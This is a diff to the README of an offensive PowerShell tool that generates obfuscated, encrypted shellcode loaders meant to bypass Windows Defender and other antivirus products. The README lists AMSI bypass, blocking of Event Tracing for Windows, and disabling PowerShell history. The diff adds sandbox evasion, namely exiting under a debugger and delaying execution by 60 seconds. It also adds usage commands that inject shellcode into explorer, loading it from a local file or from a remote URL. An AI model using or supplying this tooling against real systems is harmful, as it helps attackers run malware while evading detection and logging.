@@ -29,6 +29,7 @@ It generates an obfuscated and encrypted shellcode loader script that will injec
   --- or ---
   - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
 ```
+
 > Input 
   - Shellcode format (e.g. [Byte[]] $buf = 0xfc,0x48,0x83,...)
   - Metasploit C2 Framework  
@@ -40,7 +41,7 @@ It generates an obfuscated and encrypted shellcode loader script that will injec
 --------------------------------------
 ### Invoke-PoSH-ShellCodeLoader2.ps1
 --------------------------------------
-'Invoke-PoSH-ShellCodeLoader2' is a simple shellcode loader generator that aims to bypass AV solutions such as Windows Defender.  
+'Invoke-PoSH-ShellCodeLoader2' is a shellcode loader generator that aims to bypass AV solutions such as Windows Defender.  
 It generates an obfuscated and encrypted shellcode loader script that will inject the shellcode into a target process's virtual address space.  
 
 > Features
@@ -49,13 +50,24 @@ It generates an obfuscated and encrypted shellcode loader script that will injec
   - AMSI bypass
   - Blocking Event Tracing for Windows (ETW)
   - Disabling PowerShell history logging
+  - Basic sandbox evasion techniques (optional)
+    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
+    - wait for 60 seconds before execution
 
 > Usage
+1. Example with a shellcode file stored locally
+```
+  - Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
+  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1 
+    --- or ---
+  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
+```
+2. Example with a shellcode file stored on a remote web server
 ```
   - Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
   - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1
     --- or ---
-  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1
+  - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
 ```
 
 > Input 
